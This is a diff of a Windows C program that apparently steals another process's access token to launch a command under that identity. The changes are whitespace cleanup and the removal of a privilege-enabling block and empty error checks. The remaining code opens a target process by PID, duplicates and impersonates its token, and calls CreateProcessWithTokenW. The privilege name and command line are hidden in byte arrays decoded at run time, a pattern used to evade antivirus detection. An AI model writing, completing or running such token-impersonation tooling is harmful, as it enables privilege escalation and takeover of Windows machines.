@@ -2,17 +2,17 @@
 #include <tlhelp32.h>
 
 BOOL SetPrivilege(
-	HANDLE hToken,          
-	unsigned char* lpszPrivilege,  
-	BOOL bEnablePrivilege   
+	HANDLE hToken,
+	unsigned char* lpszPrivilege,
+	BOOL bEnablePrivilege
 )
 {
 	TOKEN_PRIVILEGES tp;
 	LUID luid;
 	if (!LookupPrivilegeValue(
-		NULL,            
-		(LPCWSTR)lpszPrivilege,   
-		&luid))       
+		NULL,
+		(LPCWSTR)lpszPrivilege,
+		&luid))
 	{
 		return FALSE;
 	}
@@ -22,7 +22,7 @@ BOOL SetPrivilege(
 		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 	else
 		tp.Privileges[0].Attributes = 0;
-	
+
 	if (!AdjustTokenPrivileges(
 		hToken,
 		FALSE,
@@ -231,22 +231,8 @@ int main()
 		RGk[gOR] = jcpm;
 	}
 
-
-	HANDLE currentTokenHandle = NULL;
-	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
-	if (SetPrivilege(currentTokenHandle, RGk, TRUE))
-	{
-	}
-
 	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, PID_TO_IMPERSONATE);
-	if (GetLastError() == NULL)
-	{
-	}
-
 	BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
-	if (GetLastError() == NULL)
-	{
-	}
 
 	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
 	if (GetLastError() == NULL)
@@ -255,9 +241,6 @@ int main()
 	}
 
 	BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
-	if (GetLastError() == NULL)
-	{
-	}
 	wchar_t commandLine[64];
 	unsigned char MhUmZ[] =
 	{
@@ -332,7 +315,7 @@ int main()
 		ETaaB -= 0x3;
 		ETaaB ^= oIT;
 		MhUmZ[oIT] = ETaaB;
-		
+
 	}
 	for (unsigned int i = 0; i < sizeof(MhUmZ); ++i)
 	{
@@ -342,9 +325,6 @@ int main()
 
 
 	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, commandLine, NULL, 0, NULL, NULL, &startupInfo, &processInformation);
-	if (GetLastError() == NULL)
-	{
-	}
 
 	return 0;
 }
